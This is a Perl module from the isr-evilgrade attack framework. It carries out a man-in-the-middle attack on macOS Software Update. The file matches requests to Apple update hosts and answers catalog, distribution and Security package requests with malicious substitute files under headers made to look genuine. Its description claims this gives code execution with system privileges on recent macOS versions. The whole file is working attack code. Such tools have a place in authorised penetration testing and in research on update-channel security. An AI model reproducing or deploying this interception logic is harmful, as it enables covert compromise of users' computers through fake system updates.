###############
# macos_softwareupdate.pm
#
# macOS Software Update MITM attack
# Intercepts and injects malicious updates into macOS update catalog
# Targets .sucatalog XML files used by System Update mechanism
#
# This file is part of isr-evilgrade, www.faradaysec.com .

package modules::macos_softwareupdate;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'macOS Software Update',
    'version'     => '1.0',
    'appver'      => 'macOS 10.15+, Sequoia',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Intercepts macOS Software Update catalog requests and injects malicious updates.
Targets .sucatalog XML files from Apple update servers.
Enables arbitrary code execution with system privileges via bogus update packages.
Affects: Monterey, Ventura, Sonoma, Sequoia (all modern macOS versions).
    },
    'vh' => '(swcdn\.apple\.com|macOS.*security.*updates|updates\.apple\.com)',
    'request' => [
        {
            'req'   => '/.*\.sucatalog',
            'type'  => 'file',
            'file'  => './include/macos/malicious.sucatalog',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/xml\r\n"
                . "Content-Disposition: attachment; filename=index.sucatalog\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/.*Security.*\.pkg',
            'type'  => 'file',
            'file'  => './include/macos/malicious_security_update.pkg',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=SecurityUpdate.pkg\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/.*\.dist',
            'type'  => 'file',
            'file'  => './include/macos/malicious.dist',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: text/xml\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
